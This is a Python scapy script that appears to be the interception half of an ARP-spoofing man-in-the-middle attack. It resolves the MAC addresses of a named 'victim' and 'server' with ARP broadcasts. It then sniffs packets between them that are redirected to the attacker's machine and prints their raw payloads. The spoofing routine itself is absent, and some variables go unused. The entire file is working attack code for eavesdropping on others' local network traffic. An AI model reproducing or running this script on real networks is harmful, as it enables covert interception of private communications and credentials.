from scapy.layers.inet import IP
from scapy.all import *
import scapy.all as scapy
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
import sys

send_router = 0
send_victim = 0
change = True

MY_IP = ''
VICTIM_IP = "192.168.1.219"
SERVER_IP = "192.168.1.1"

MY_MAC = ''
VICTIM_MAC = ''
SERVER_MAC = ''


def handle_packet(pack):
    if pack.haslayer(IP) and pack.haslayer(Raw):
        if (pack[IP].src == VICTIM_IP and pack[IP].dst == SERVER_IP
                and pack[Ether].src == VICTIM_MAC and pack[Ether].dst == MY_MAC):
            print("client: " + pack[Raw].load.decode())
        if (pack[IP].src == SERVER_IP and pack[IP].dst == VICTIM_IP
                and pack[Ether].src == SERVER_MAC and pack[Ether].dst == MY_MAC):
            print("server: " + pack[Raw].load.decode())


def sniff_and_redirect():
    sniff(prn=handle_packet, store=0)


# main method that handles packet sniffing and passing
def sniff_packets():
    global change
    global send_router
    global send_victim
    # Enable sniffing
    print("Sniffing packets...")
    sniff(prn=handle_packet, store=0)


def get_mac_address(ip):
    global VICTIM_MAC
    global SERVER_MAC
    global VICTIM_IP
    global SERVER_IP
    if ip == VICTIM_IP and VICTIM_MAC != '':
        return VICTIM_MAC
    if ip == SERVER_IP and SERVER_MAC != '':
        return SERVER_MAC
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    try:
        mac = answer[0][1].hwsrc
        if ip == VICTIM_IP:
            VICTIM_MAC = mac
        if ip == SERVER_IP:
            SERVER_MAC = mac
        return mac
    except IndexError:
        if ip == VICTIM_IP:
            return VICTIM_MAC
        else:
            return SERVER_MAC


if __name__ == "__main__":
    sys.argv.pop(0)
    args = sys.argv
    if len(args) != 3:
        print('Invalid number of arguments')
        exit(1)
    VICTIM_IP = args[0]
    SERVER_IP = args[1]
    MY_IP = args[2]
    while not MY_MAC or not VICTIM_MAC or not SERVER_MAC:
        MY_MAC = get_mac_address(MY_IP)
        VICTIM_MAC = get_mac_address(VICTIM_IP)
        SERVER_MAC = get_mac_address(SERVER_IP)
    print(f'My IP: {MY_IP}\nVictim IP: {VICTIM_IP}\nSERVER IP: {SERVER_IP}'
          f'\n\nMy MAC: {MY_MAC}\nVictim MAC: {VICTIM_MAC}\nSERVER MAC: {SERVER_MAC}')
    sniff_packets()
